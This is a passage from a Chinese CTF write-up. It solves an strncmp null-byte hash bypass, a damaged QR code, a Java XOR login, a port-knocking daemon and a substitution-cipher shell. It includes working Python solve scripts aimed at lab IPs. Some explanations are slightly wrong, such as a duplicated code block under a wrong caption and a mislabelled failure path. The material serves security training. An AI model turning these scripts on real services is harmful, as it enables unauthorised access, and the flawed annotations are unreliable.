        snprintf(buf, sizeof(buf)-1, "Your hash %s does not match the secret hash %s", hash_str, secret_hash_str);
        sendline(client_socket, buf);
    }   

    // 关闭客户端连接
    close(client_socket);
}
```

这里开发者犯了两个个关键错误：

```c
if (strncmp(secret_hash, hash, SHA_DIGEST_LENGTH) == 0)
```

- **函数选择错误**：SHA1 的结果是**二进制字节流**，可能包含 `0x00`。而 `strncmp` 是为 **C 风格字符串** 设计的，它对 `0x00`（Null 终止符）极其敏感

- **错误处理泄露**：在 `else` 分支中，竟然把正确的 `secret_hash` 完整地打印了出来

**漏洞原理：`strncmp` 截断绕过**

`strncmp(s1, s2, n)` 的比较逻辑如下：

- 逐字节对比 $s1[i]$ 和 $s2[i]$

- **停止条件**：
  
  - 发现 $s1[i] \neq s2[i]$（返回非 0，判定失败）
  
  - **在任意一边遇到了 `\x00`**
  
  - 达到了指定的长度 $n$

通过一次简单的交互，从报错信息中获取 `secret_hash`

![](https://pic1.imgdb.cn/item/699ff4f3d9fa54ce3f149529.png)

发现目标哈希的第三字节竟然是 `00`

所以我们只需要匹配前三个字节 `3B FC 00`，将碰撞出的明文字符串发送给服务器

此时服务器端的 `strncmp` 会在比对到第三字节时因为双向 `\x00` 而判定通过，从而执行 `Congratulations` 分支，打印出 `secret_key`

```python
import hashlib
from pwn import *

# 目标哈希前缀（3B FC 00），以字节形式存储
TARGET_PREFIX = bytes.fromhex("3BFC00")

def solve():
    """
    主函数：不断尝试不同的输入，直到找到 SHA1 哈希值以 TARGET_PREFIX 开头的字符串，
    然后使用该字符串作为密码连接远程服务器
    """
    log.info("正在执行更精准的碰撞：匹配 3B FC 00...")

    count = 0                     # 初始化尝试计数器
    while True:
        # 将计数转换为字节串（例如 b'0', b'1', b'2' ...）作为尝试的输入
        attempt = str(count).encode()
        # 计算 SHA1 哈希值，得到 20 字节的摘要
        current_hash = hashlib.sha1(attempt).digest()

        # 检查哈希值是否以目标前缀开头
        if current_hash.startswith(TARGET_PREFIX):
            # 找到碰撞，输出成功信息及详细数据
            log.success(f"碰撞成功！尝试次数: {count}")
            log.info(f"生成 Hash: {current_hash.hex().upper()}")

            # 连接远程服务器（IP 和端口需根据实际情况修改）
            io = remote('192.168.187.135', 12345)
            # 接收服务器的提示信息，直到遇到 "Enter your password:"
            io.recvuntil(b"Enter your password:")
            # 发送找到的密码（即 attempt）
            io.sendline(attempt)

            # 打印分隔线和服务器返回的所有数据
            print("\n" + "="*40)
            print(io.recvall().decode())
            print("="*40)
            return          # 任务完成，退出函数

        count += 1          # 尝试下一个数字
        # 每尝试 100 万次，输出一次进度，便于观察
        if count % 1000000 == 0:
            log.info(f"已尝试 {count} 次...")

# 如果该脚本作为主程序运行，则调用 solve() 函数
if __name__ == '__main__':
    solve()
```

![](https://pic1.imgdb.cn/item/699ff5e8d9fa54ce3f149533.png)

### Reed Between The Lines（二维码修复）

```
在一个与 Fortcerts 签约的 RL 取证公司案件中在一台可疑的计算机上发现了一幅图像
分析人士认为图像中隐藏着被破坏的信息
作为一名“计算机专家”他们希望您从该图像中恢复数据
```

有个二维码

![](https://pic1.imgdb.cn/item/699ffd99569239540e67582c.png)

手动构造一个 29*29 的图案在 PS 中

![](https://pic1.imgdb.cn/item/699ffe02569239540e675861.png)

我们要在二维码中添加缺少的二维码的必需部分，首先最重要的是在右上角定位立方体

![](https://pic1.imgdb.cn/item/69a0004a569239540e675973.png)

接下来我们将添加被破坏的时间和元数据位，幸运的是定时位总是相同的并且元数据位在二维码的两个位置上重复

![](https://pic1.imgdb.cn/item/69a021f3569239540e676aa4.png)

如您所见元数据部分跨每个有色部分的两个不同位置进行镜像

这就是我们如何确定在丢失的部分中要设置哪些位的方法

此时您可以尝试使用二维码阅读器读取二维码但是二维码中没有足够的错误更正来弥补缺失的部件

所以我们需要尝试手动读取当生成一个二维码时它在数据位上应用了一个屏蔽元数据位就不会被屏蔽

所以要读取数据我们需要取消对其的屏蔽，为了确定使用了什么掩模我们需要查看掩模位

在这种情况下它是[黑色][黑色][白色]或110

![](https://pic1.imgdb.cn/item/69a022f9569239540e676ac7.png)

如我们所见这个二维码上使用的屏蔽模式是 `行+列%3=0`，如下所示

![](https://pic1.imgdb.cn/item/69a02405569239540e676af7.png)

掩码应用程序是一个简单的异或操作

因此如果一个正方形是填充在掩模中的而在二维码中它是颠倒的否则它不会改变

我们将掩模应用到二维码中不包括原始图像中胶带隐藏的部分

这给了我们以下的二维码

![](https://pic1.imgdb.cn/item/69a02438569239540e676afb.png)

在二维码中数据从右下角开始存储，然后它从右到左以两列的形式上下移动

下面的图片来自显示了数据存储在二维码中的方式

![](https://pic1.imgdb.cn/item/69a0251c569239540e676b12.png)

此图像的右侧指示位的读取顺序

然而，这幅图像有点误导性，因为它没有考虑开始时的四个编码位或接下来的八个编码位的长度

为了解释我们的二维码，我们需要知道数据的编码和长度

编码由从二维码右下角开始的前四位决定

在下一页的图片中，这些都是红色边框，长度由下一页图像中以紫色边界的下八位决定

![](https://pic1.imgdb.cn/item/69a0255d569239540e676b19.png)

有一个表格告诉我们每个编码方案是什么

当读取位时，右下角是最重要的，向上时从右向左读取

这给我们提供了 0100，它查看的表是字节编码

现在，为了读取长度，我们再次使用这八个位的右下角作为最重要的位

这给了我们 0010 0000，即 32，这是以字节为单位的，所以我们的字节编码字符串是 32 字节长

知道了这一点，我们可以根据地图上的图案，从二维码中找出 32 个字符

下面显示的是我们的二维码，每个字符都以淡蓝色边框

![](https://pic1.imgdb.cn/item/69a026a1569239540e676ec2.png)

**注意：我们映射的字符左边的位是错误更正位。我们不需要这些来读取字符**

现在我们需要读字符，第一个和第二个字符没有被遮挡，所以我们可以阅读这些字符

第一个字符是 01001000 或 72，作为十进制数，72 在 ASCII 中是 "H"，所以第一个字符是 "H""

第二个字符是 00000000，在 ASCII 中为空。正如我们很快看到的，在突出显示的字符中，每秒钟字符都是一个空字符

这告诉我们这个字符串可能是Unicode。这一点很重要，因为我们现在知道每一个字节都应该是空的，这样我们就可以开始预测应该在模糊区域中的数据

我们知道的下一个不被遮蔽且不为空的字符是第 7 个。此字符位于下一行，因此右上角将成为最重要的位，如本文前面的图表所示

解码这个字符会得到 01101011 或 107。在ASCII中，这是一个 "k"

我们继续此过程以解码原始图像中未被遮挡的字符

完成此过程后，我们有一个具有此格式的 Unicode 字符串

```
H__kTh_P____t___
```

此字符串中的下划线表示在原始二维码中被隐藏的字符

知道字符串是 Unicode，这是 cysca 中的标志格式，这是一个 CTF，我们可以推断出密钥的开头很可能是 "hacktheplanet"

我们现在对多余的预测字符进行编码，并将它们放回我们的二维码中。经过这一过程，我们得到的二维码如下图所示

![](https://pic1.imgdb.cn/item/69a027a9569239540e676eef.png)

但是，我们仍然不知道钥匙末端的三个数字

希望我们现在已经预测了足够的数据，以便进行错误修正，为我们完成这一关键

所以我们把这个面具重新贴在二维码上，下图显示了之后的二维码

![](https://pic1.imgdb.cn/item/69a027e3569239540e676ef4.png)

现在我们可以把它装进一个二维码阅读器，如果你有幸拥有一个好的二维码阅读器，它可能已经能够读到这个并给你钥匙了

但是，如果没有，我们可以添加更多的数据

记得之前我们说过这是一个 Unicode 字符串。正如你在上面看到的，我们在数字应该出现的缺失区域仍然没有任何数据

如果每一个第二个字节都是空的，我们知道在应用了掩码之后，它看起来就像是一个掩码

在这一过程之后，我们将得到以下二维码

![](https://pic1.imgdb.cn/item/69a0281f569239540e676efd.png)

## Reverse Engineering

### U JAD BRO?（异或加密）

```
Telabad 公司的员工忘记了他们的适当数据保护 Java 应用程序的密码
他们需要您检索存储在应用程序中的数据并提交它
```

下载下来是一个登录的 Jar

![](https://pic1.imgdb.cn/item/69a13975ec0a30908d678a85.png)

通过 Jadx 反编译找到登录逻辑

```java
public class PRAuthService {

    // 硬编码的用户名，以字符串常量形式直接暴露在代码中
    private static final String LOGIN_USERNAME = new String("Hero33");

    /**
     * 硬编码的密码哈希值（SHA-256，无盐）
     * 转换为十六进制为：
     * f483a35dea697e7e75ebc791028502da183258cd23aeff0327957dc56f703af3
     */
    private static final byte[] LOGIN_HASHED_PASSWORD = {
        -12, -125, -83, 93, -22, 105, 126, 126, 117, -21, -57, -111,
        2, -123, 2, -38, 24, 50, 88, -51, 35, -82, -1, 3, 39, -107,
        125, -59, 111, 112, 58, -13
    };

    /**
     * 执行用户认证的方法
     *
     * @param username 用户输入的用户名
     * @param password 用户输入的密码明文
     * @return 若认证成功则返回 AuthenticatedSession 对象，否则返回 null
     */
    public AuthenticatedSession authenticate(String username, String password) {
        // 第一步：比较用户名是否与硬编码值相等
        if (LOGIN_USERNAME.equals(username)) {
            // 第二步：对输入密码进行 SHA-256 哈希
            byte[] hashedInput = hashPassword(password);
            // 第三步：比较计算出的哈希与硬编码哈希是否一致
            if (Arrays.equals(LOGIN_HASHED_PASSWORD, hashedInput)) {
                // 认证通过，创建会话对象（第二个参数为 null，可能表示无额外令牌）
                return new AuthenticatedSession(username, null);
            }
            // 密码不匹配，返回 null
            return null;
        }
        // 用户名不匹配，返回 null
        return null;
    }

    /**
     * 使用 SHA-256 算法计算密码的哈希值
     *
     * @param clearTextPassword 明文密码
     * @return 20字节的 SHA-256 哈希值（实际为32字节，此处返回 byte[]）
     */
    private byte[] hashPassword(String clearTextPassword) {
        byte[] result = null;
        try {
            // 获取 SHA-256 算法实例
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            // 将密码字符串按 UTF-8 编码转换为字节并更新到摘要中
            md.update(clearTextPassword.getBytes("UTF-8"));
            // 完成哈希计算
            result = md.digest();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e2) {
            e2.printStackTrace();
        }
        return result;
    }
}
```

但是通过后不给 flag，在另一个代码中找到加密逻辑

以用户名为密钥加密

```java
public class PRContentService {

    // 硬编码的加密字节数组，存储了经过 XOR 加密的内容
    private static final byte[] CIPHERED_BYTES = {
        30, 0, 21, 8, 90, 86, 4, 0, 10, 6, 80, 92, 38, 53, 30, 26,
        80, 88, 113, 87, 67
    };

    /**
     * 执行 XOR 加密/解密的辅助方法
     * 算法：将输入字符串的每个字符与密钥字符串的对应字符（循环使用）进行异或运算
     *
     * @param text 待处理的字符串（明文或密文）
     * @param key  密钥字符串（用于异或的字节序列）
     * @return 异或后的结果字符串（字符级操作）
     */
    private String cipherString(String text, String key) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            // 对每个字符进行异或，key 循环使用
            sb.append((char) (text.charAt(i) ^ key.charAt(i % key.length())));
        }
        return sb.toString();
    }

    /**
     * 获取受保护的内容。该方法接收一个已认证的会话，并使用会话中的用户名作为密钥，
     * 对硬编码的加密字节数组进行解密
     *
     * 实现流程：
     * 1. 将硬编码的 CIPHERED_BYTES 字节数组直接转换为字符串
     * 2. 以该字符串作为密文，以 session.getUsername() 作为密钥，调用 cipherString 进行解密
     * 3. 返回解密后的字符串
     *
     * @param session 认证会话对象，包含用户名（作为密钥）
     * @return 解密后的内容字符串（但可能因编码问题而损坏）
     */
    public String getContent(AuthenticatedSession session) {
        // 将硬编码密文字节转换为字符串（可能引入编码错误）
        String encrypted = new String(CIPHERED_BYTES);
        // 使用用户名作为密钥进行 XOR 解密
        String result = cipherString(encrypted, session.getUsername());
        return result;
    }
}
```

所以我们直接异或解密拿到 flag

![](https://pic1.imgdb.cn/item/69a146f6ec0a30908d678ed7.png)

### Knock Knock（端口敲击）

```
Terrabad 公司提供了一种二进制文件，他们认为这是安全领域的“下一件大事”
他们想把它作为一个安全的产品来认证
我们需要你对算法进行逆向工程来理解它的作用
完成此操作后，测试服务器将以 192.168.0.104:3422 运行，以证明您完全恢复了算法
```

IDA 分析逆向 `sub_8048F9A()` 函数

监听固定端口 **3422**，对每个客户端连接 `fork` 子进程，子进程调用核心处理函数 `sub_80491F4`

```c
void __noreturn sub_8048F9A()
{
    socklen_t addr_len; // [esp+28h] [ebp-40h] BYREF
    int optval;         // [esp+2Ch] [ebp-3Ch] BYREF
    int fd;             // [esp+30h] [ebp-38h]
    int v3;             // [esp+34h] [ebp-34h]
    __pid_t v4;         // [esp+38h] [ebp-30h]
    struct sockaddr addr;   // [esp+3Ch] [ebp-2Ch] BYREF
    struct sockaddr v6;     // [esp+4Ch] [ebp-1Ch] BYREF
    unsigned int v7;        // [esp+5Ch] [ebp-Ch]   // 栈cookie，用于检测栈溢出

    // 栈保护：获取gs:0x14处的随机值（通常用于stack canary）
    v7 = __readgsdword(0x14u);

    puts("Running portknockd");

    // 设置信号处理：SIGPIPE（13）和SIGCHLD（17）均被忽略（1通常对应SIG_IGN）
    // 忽略SIGPIPE防止向已关闭的socket写数据时进程终止
    // 忽略SIGCHLD避免子进程成为僵尸（由系统自动回收）
    signal(13, (__sighandler_t)1);
    signal(17, (__sighandler_t)1);

    // 创建TCP socket：AF_INET(2), SOCK_STREAM(1), protocol 0
    fd = socket(2, 1, 0);
    if (fd < 0)
    {
        perror("FATAL ERROR opening socket");
        exit(1);
    }

    // 准备bind地址结构
    addr.sa_family = 2;                       // AF_INET
    memset(&addr.sa_data[2], 0, 12);           // 清零地址结构的剩余部分
    *(_WORD *)addr.sa_data = htons(0xD5Eu);    // 设置端口0xD5E（十六进制）= 3422（十进制）

    // 设置socket选项：SO_REUSEADDR（2），允许重用本地地址
    optval = 1;
    setsockopt(fd, 1, 2, &optval, 4u);         // SOL_SOCKET(1), SO_REUSEADDR(2)

    // 绑定socket到3422端口，地址结构长度16（sizeof(struct sockaddr_in)）
    if (bind(fd, &addr, 0x10u) < 0)
    {
        perror("FATAL ERROR on binding");
        exit(1);
    }

    // 开始监听，最大挂起连接数为5
    listen(fd, 5);

    addr_len = 16;  // 接受连接时传入客户端地址结构的长度

    // 主循环：不断接受新连接
    while (1)
    {
        // 接受客户端连接，客户端地址存储在v6中
        v3 = accept(fd, &v6, &addr_len);
        puts("portknockd: New client connected");

        // 创建子进程处理连接
        v4 = fork();
        if (v4 < 0)               // fork失败
            break;
        if (!v4)                  // 子进程
        {
            if (v3 < 0)            // 检查accept是否成功（其实已在上面判断过）
            {
                perror("FATAL ERROR: could not accept connections");
                exit(1);
            }
            close(fd);              // 子进程关闭监听socket，只处理已连接socket
            sub_80491F4(v3);         // 调用处理函数，v3作为参数传递
            exit(0);                // 子进程处理完毕后退出
        }
        // 父进程关闭已连接socket，继续循环
        close(v3);
    }

    // 如果跳出循环（fork失败），打印错误并退出
    perror("FATAL ERROR: could not fork");
    exit(1);
}
```

然后是调用了 `sub_80491F4()` 函数

执行五轮（`i=0..4`）挑战‑响应握手。每轮中：

- 设置10秒接收超时

- 获取4字节挑战值（`sub_8049616`），发送给客户端

- 读取客户端4字节响应，与本地计算的期望值（`sub_80495E4`）比对

- 若验证失败，关闭连接并退出

- 若 `i<4`：关闭当前连接，调用 `sub_8049440(i)` 切换到下一阶段端口，返回新的客户端连接，继续下一轮

- 若 `i==4`：验证成功后调用 `sub_804935D` 授予后门访问，随后退出

```c
/**
 * 端口敲门协议的核心处理函数。
 * 该函数处理一个已连接的客户端套接字，执行一个5阶段的挑战-响应握手。
 * 每阶段中，服务器生成一个挑战值发送给客户端，客户端必须返回正确的响应。
 * 只有全部5阶段验证成功，才会调用后门函数 sub_804935D 授予访问权限。
 *
 * @param a1 已连接的客户端套接字描述符（由主循环的 accept 传入）
 * @return  理论上永不返回（进程 exit 或调用后门后退出）
 */
int __cdecl sub_80491F4(int a1)
{
    int result;          // eax 寄存器，实际未使用最终返回值（函数内 exit）
    int v2;              // [esp+18h] [ebp-20h] BYREF  客户端响应值
    int buf;             // [esp+1Ch] [ebp-1Ch] BYREF  服务器生成的挑战值
    unsigned int i;      // [esp+20h] [ebp-18h]        当前阶段索引 (0~4)
    int fd;              // [esp+24h] [ebp-14h]        当前使用的套接字描述符
    ssize_t v6;          // [esp+28h] [ebp-10h]        write/read 的返回值
    int v7;              // [esp+2Ch] [ebp-Ch]         服务器计算的期望响应值

    fd = a1;                                     // 初始化当前套接字为传入的客户端连接
    result = puts("portknockd: New Client. Waiting for knocks");

    // 循环执行5个阶段 (i = 0,1,2,3,4)
    for (i = 0; i <= 4; ++i)
    {
        // 设置接收超时：在指定的套接字上设置10秒的接收超时
        sub_80491C5(fd, 0xAu);

        // 从客户端读取4字节数据作为挑战值？实际上名称和后续行为表明：
        // sub_8049616 可能是生成挑战值并发送给客户端的函数，但这里将其返回值赋给 buf
        // 更合理的推测：sub_8049616 从套接字读取4字节（可能包含客户端的初始数据或协商信息）
        // 而这里将其作为挑战值使用。但根据代码后续，buf 又被 write 写回客户端，所以更像是服务器生成一个随机值
        // 结合函数名推测：sub_8049616 可能内部调用 read 获取某些数据，或者直接生成随机数
        buf = sub_8049616(fd);

        // 将挑战值 buf 写回客户端（4字节）
        v6 = write(fd, &buf, 4u);
        if (v6 != 4)                             // 检查是否完整发送4字节
        {
            perror("Failed writing to socket");
            close(fd);
            exit(1);
        }

        // 初始化响应变量，然后从客户端读取4字节响应
        v2 = 0;
        v6 = read(fd, &v2, 4u);
        if (v6 != 4)                             // 检查是否完整接收4字节
        {
            perror("Failed reading from socket");
            close(fd);
            exit(1);
        }

        // 计算期望的响应值：基于挑战值 buf 和当前阶段索引 i
        v7 = sub_80495E4(buf, i);

        // 验证客户端返回的响应是否与期望值一致
        if (v7 != v2)
        {
            close(fd);                            // 验证失败，关闭连接并退出子进程
            exit(1);
        }

        // 如果是最后一个阶段（i == 4），验证成功后调用后门函数
        if (i == 4)
        {
            sub_804935D(fd);                       // 授予最终访问权限（如启动 shell）
            close(fd);
            exit(1);
        }

        // 非最后阶段：关闭当前连接，准备进入下一阶段
        close(fd);

        // 获取下一阶段需要使用的套接字描述符
        // sub_8049440 可能执行以下操作：
        //   - 绑定并监听下一个端口
        //   - 等待新的客户端连接并 accept 返回新的 fd
        //   - 根据当前阶段 i 决定下一个端口号
        fd = sub_8049440(i);
    }

    // 循环结束后理论上不会到达这里，因为循环内 i==4 时已经 exit
    // 但为了完整性保留此返回
    return result;
}
```

`sub_8049616()` 从 `/dev/urandom` 读取4字节，然后取模0x85（即133），返回一个0~132之间的数

```c
unsigned int __cdecl sub_8049616(int fd)
{
    char v2;                 // [esp+8h] [ebp-20h] 未使用的变量，可能是编译器对齐
    unsigned int ptr;         // [esp+18h] [ebp-10h] BYREF 存储从 urandom 读取的随机数
    FILE *stream;            // [esp+1Ch] [ebp-Ch] 文件指针

    // 以二进制只读方式打开 /dev/urandom
    stream = fopen("/dev/urandom", "rb");
    if (!stream)
    {
        // 打开失败则向客户端发送错误消息并退出
        sub_8048DD3(fd, "ERROR: Unable to open urandom\n", v2);
        exit(-1);
    }

    // 读取4字节随机数到 ptr
    fread(&ptr, 4u, 1u, stream);
    fclose(stream);

    // 对 0x85 取模，返回结果（确保挑战值范围较小，便于后续计算）
    return ptr % 0x85;
}

/**
 * 计算期望响应的函数。
 * 根据挑战值 a1 和当前阶段索引 a2，生成正确的响应值。
 * 算法：
 * - 如果阶段 a2 为奇数（a2 & 1 != 0），则响应 = a2 + a1 + 2
 * - 如果阶段 a2 为偶数，则响应 = a1 * (a2 + 2)
 *
 * @param a1 挑战值（来自 sub_8049616 返回的值）
 * @param a2 阶段索引（0~4）
 * @return 期望的响应值（4字节整数）
 */
int __cdecl sub_80495E4(int a1, int a2)
{
    if ((a2 & 1) != 0)          // 奇数阶段
        return a2 + a1 + 2;
    else                         // 偶数阶段
        return a1 * (a2 + 2);
}
```

`sub_8049616()` 根据阶段 `a2` 的奇偶性计算响应值

```c
unsigned int __cdecl sub_8049616(int fd)
{
    char v2;                 // [esp+8h] [ebp-20h] 未使用的变量，可能是编译器对齐
    unsigned int ptr;         // [esp+18h] [ebp-10h] BYREF 存储从 urandom 读取的随机数
    FILE *stream;            // [esp+1Ch] [ebp-Ch] 文件指针

    // 以二进制只读方式打开 /dev/urandom
    stream = fopen("/dev/urandom", "rb");
    if (!stream)
    {
        // 打开失败则向客户端发送错误消息并退出
        sub_8048DD3(fd, "ERROR: Unable to open urandom\n", v2);
        exit(-1);
    }

    // 读取4字节随机数到 ptr
    fread(&ptr, 4u, 1u, stream);
    fclose(stream);

    // 对 0x85 取模，返回结果（确保挑战值范围较小，便于后续计算）
    return ptr % 0x85;
}

/**
 * 计算期望响应的函数。
 * 根据挑战值 a1 和当前阶段索引 a2，生成正确的响应值。
 * 算法：
 * - 如果阶段 a2 为奇数（a2 & 1 != 0），则响应 = a2 + a1 + 2
 * - 如果阶段 a2 为偶数，则响应 = a1 * (a2 + 2)
 *
 * @param a1 挑战值（来自 sub_8049616 返回的值）
 * @param a2 阶段索引（0~4）
 * @return 期望的响应值（4字节整数）
 */
int __cdecl sub_80495E4(int a1, int a2)
{
    if ((a2 & 1) != 0)          // 奇数阶段
        return a2 + a1 + 2;
    else                         // 偶数阶段
        return a1 * (a2 + 2);
}
```

失败的话则是调用 `sub_8049440()` 函数

从全局数组 `dword_8049AC4` 中取出下一阶段端口号（索引 `stage+1`），创建新 socket 并 `accept` 等待客户端连接，返回新连接的描述符

```c
int __cdecl sub_8049440(int a1)
{
    socklen_t addr_len;          // [esp+2Ch] [ebp-3Ch] BYREF  客户端地址长度
    int optval;                  // [esp+30h] [ebp-38h] BYREF  setsockopt 选项值
    int fd;                      // [esp+34h] [ebp-34h]        新监听 socket
    int v5;                      // [esp+38h] [ebp-30h]        接受的新连接 socket
    struct sockaddr addr;        // [esp+3Ch] [ebp-2Ch] BYREF  本地地址结构
    struct sockaddr v7;          // [esp+4Ch] [ebp-1Ch] BYREF  客户端地址结构
    unsigned int v8;             // [esp+5Ch] [ebp-Ch]         栈 cookie (canary)
    int v9;                      // [esp+70h] [ebp+8h]         端口数组索引 (a1+1)

    // 获取栈保护 canary 值
    v8 = __readgsdword(0x14u);

    // 忽略 SIGPIPE 信号（防止写入已关闭连接时进程终止）
    signal(13, 1);  // 1 通常表示 SIG_IGN

    // 检查阶段索引是否有效（a1 应 <=3，因为只有前4个阶段需要切换端口）
    if (a1 > 3)
    {
        perror("FATAL ERROR bad knock number");
        exit(1);
    }

    // 计算下一个阶段在端口数组中的索引（a1+1）
    v9 = a1 + 1;

    // 创建 TCP socket (AF_INET, SOCK_STREAM)
    fd = socket(2, 1, 0);
    if (fd < 0)
    {
        perror("FATAL ERROR opening socket");
        exit(1);
    }

    // 清零地址结构体
    memset(addr.sa_data, 0, sizeof(addr.sa_data));
    addr.sa_family = 2;  // AF_INET

    // 从全局数组 dword_8049AC4 中取出下一个端口号（主机字节序），
    // 转换为网络字节序后存入 sockaddr 的前两个字节
    *(unsigned short *)addr.sa_data = htons(dword_8049AC4[v9]);

    // 设置 SO_REUSEADDR 选项，允许重用本地地址
    optval = 1;
    setsockopt(fd, 1, 2, &optval, 4u);  // SOL_SOCKET, SO_REUSEADDR

    // 绑定 socket 到指定端口
    if (bind(fd, &addr, 0x10u) < 0)     // sizeof(struct sockaddr_in) = 16
    {
        perror("FATAL ERROR on binding");
        exit(1);
    }

    // 开始监听，最大挂起连接数设为 5
    listen(fd, 5);

    addr_len = 16;  // 客户端地址结构长度
    // 阻塞等待客户端连接，客户端地址存入 v7
    v5 = accept(fd, &v7, &addr_len);

    // 关闭监听 socket，不再需要
    close(fd);

    // 检查 accept 是否成功
    if (v5 < 0)
    {
        perror("FATAL ERROR on accept");
        exit(1);
    }

    // 返回已连接的客户端 socket 描述符
    return v5;
}
```

查看全局数组 `dword_8049AC4` 中的端口号

| 地址        | 小端十六进制     | 十进制  |
| --------- | ---------- | ---- |
| 0x8049AC4 | 0x00000D5E | 3422 |
| 0x8049AC8 | 0x000011B4 | 4532 |
| 0x8049ACC | 0x00001723 | 5923 |
| 0x8049AD0 | 0x00000926 | 2342 |
| 0x8049AD4 | 0x0000159C | 5532 |

![](https://pic1.imgdb.cn/item/69a270b035e6d410659c4fb6.png)

最后成功的话是调用了 `sub_804935D()` 函数

```c
unsigned int __cdecl sub_804935D(int fd)
{
    char buf[128];              // [esp+2Ch] [ebp-8Ch] 存储 flag 的缓冲区
    unsigned int v3;             // [esp+ACh] [ebp-Ch]  栈 cookie (canary)

    // 获取栈保护 canary 值
    v3 = __readgsdword(0x14u);

    // 调用 sub_8048EE0 将 flag 内容填充到 buf 中
    // sub_8048EE0 可能从文件、内存或硬编码字符串中读取 flag，
    // 确保缓冲区不超过 128 字节
    sub_8048EE0(buf, 128);

    // 将 flag 通过套接字发送给客户端
    // 使用 strlen(buf) 确定发送长度，并检查是否完整发送
    if (write(fd, buf, strlen(buf)) != strlen(buf))
    {
        // 发送失败时记录错误并退出
        perror("Failed writing flag to socket");
        close(fd);
        exit(1);
    }

    // 返回栈 cookie 的校验值（与初始值异或）
    // 若栈被破坏，__readgsdword(0x14u) 的值将不同于 v3，
    // 异或结果非零，但此返回值未被调用者使用，因此实际无校验作用
    // 可能仅为编译器插入的栈保护 epilogue 的残留
    return __readgsdword(0x14u) ^ v3;
}
```

编写脚本如下

```python
#!/usr/bin/env python3
import socket
import struct
import time

def mangle(challenge: int, stage: int) -> int:
    """
    根据阶段索引计算响应值
    :param challenge: 从服务器接收的挑战值（0~132）
    :param stage: 当前阶段索引（0~4）
    :return: 应发送的响应值
    """
    if stage & 1:  # 奇数阶段
        return challenge + stage + 2
    else:          # 偶数阶段
        return challenge * (stage + 2)

def main():
    # 目标服务器IP（根据实际情况修改）
    HOST = "192.168.187.135"
    # 从二进制中提取的端口序列
    PORTS = [3422, 4532, 5923, 2342, 5532]

    for stage, port in enumerate(PORTS):
        print(f"[*] Stage {stage}: connecting to {HOST}:{port}")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)  # 防止卡死
            sock.connect((HOST, port))
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return

        # 接收4字节挑战值（小端序）
        data = sock.recv(4)
        if len(data) != 4:
            print("[-] Failed to receive challenge")
            sock.close()
            return
        challenge = struct.unpack("<I", data)[0]  # 无符号小端
        print(f"[+] Received challenge: {challenge}")

        # 计算响应并发送
        response = mangle(challenge, stage)
        print(f"[+] Sending response: {response}")
        sock.send(struct.pack("<I", response))

        if stage == 4:
            # 最后阶段，接收flag
            flag_data = sock.recv(4096)
            print("\n[+] Flag received:")
            print(flag_data.decode().strip())
            sock.close()
        else:
            # 非最后阶段，关闭当前连接，稍等后进入下一端口
            sock.close()
            # 等待服务器准备下一端口（官方WP建议0.1秒，这里稍微延长保证稳定）
            time.sleep(0.2)

if __name__ == "__main__":
    main()
```

![](https://pic1.imgdb.cn/item/69a2771335e6d410659c50c5.png)

## Crypto

### Standard Galactic Alphabet（单表替换）

```
对 Fortcerts “Slightly Secure Shell” 程序中使用的自定义加密执行白盒评估
确定其实施中的任何漏洞，并证明可以利用这些漏洞获取机密信息
```

查看源代码

```python
import subprocess


def execute_command(command, plain, coded):
    """执行bash命令并对输出进行字符替换"""
    # 打印正在执行的命令
    print "Running command: bash %s" % command
    # 启动子进程执行bash命令，捕获标准输出和错误输出
    proc = subprocess.Popen(
        ("/bin/bash", "-c", command),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    proc.wait()  # 等待命令执行完成
    # 读取标准输出和错误输出并合并
    stdoutdata = proc.stdout.read()
    stdoutdata += proc.stderr.read()
    output = ""
    # 遍历输出的每个字符，进行替换
    for letter in stdoutdata:
        if letter in plain:
            output += coded[plain language=".find(letter)"][/plain]
        else:
            output += letter

    return output


def handle_client(conn, addr):
    """处理客户端连接与命令交互"""
    # 定义可接受的字符集（包括特殊字符、字母、数字、空格）
    plain = "`1234567890-=~!@#$%^&*()_+[]\{}|;':\",./<>?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ "
    # 向客户端发送欢迎消息
    conn.send("You have connected to the Slightly Secure Shell server of Fortress Certifications.\n")
    coded = shuffle_plain(plain)  # 生成初始替换字符集（注：shuffle_plain未在代码中定义）
    command = ""  # 初始化命令缓冲区
    conn.send("#>")  # 发送命令提示符

    while 1:
        data = conn.recv(1)  # 接收1字节数据
        if not data:
            break  # 连接断开则退出循环
        # 处理退格键（ASCII 127或8）
        if data == "\x7f" or data == "\x08":
            if len(command) > 0:
                command = command[:-1]  # 删除命令缓冲区最后一个字符
            continue
        # 处理换行符（Enter键）
        if data == "\n" or data == "\r":
            if len(command) == 0:
                continue  # 空命令则跳过
            conn.send("Running command: '%s'\n" % command)
            # 执行命令并获取替换后的输出
            cmd_stdout = execute_command(command, plain, coded)
            conn.sendall(cmd_stdout + "\n")  # 发送命令输出
            command = ""  # 清空命令缓冲区
            conn.sendall("Key reset\n")  # 通知客户端密钥重置
            coded = shuffle_plain(plain)  # 重新生成替换字符集
            conn.sendall("#>")  # 发送新的命令提示符
        else:
            # 仅接受plain字符集中的字符
            if data not in plain:
                continue
            command += data  # 将字符添加到命令缓冲区
        conn.sendall(data)  # 回显字符给客户端
    conn.close()  # 关闭客户端连接
```

这是一个**固定、已知的字符集**（共72个可打印ASCII字符，包含数字、字母、标点、空格）

```python
plain = "`1234567890-=~!@#$%^&*()_+[]\{}|;':\",./<>?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ "
```

`shuffle_plain` 会随机打乱 `plain` 字符串

**关键点**：`coded` 是 `plain` 的**随机排列**，作为加密密钥。但每次命令执行后重置（`coded = shuffle_plain(plain)`），导致**每次命令的加密密钥独立**

```python
coded = shuffle_plain(plain)  # 每次命令执行后重置
```

- **加密机制**：基于 `plain` 的单表替换密码
  - 每个字符 `letter` 在 `plain` 中的**索引**（`plain.find(letter)`）被映射到 `coded` 中的对应字符
  - 例如：若 `plain = "abc"`，`coded = "cba"`，则 `a` → `c`，`b` → `b`，`c` → `a`
- **弱点**：
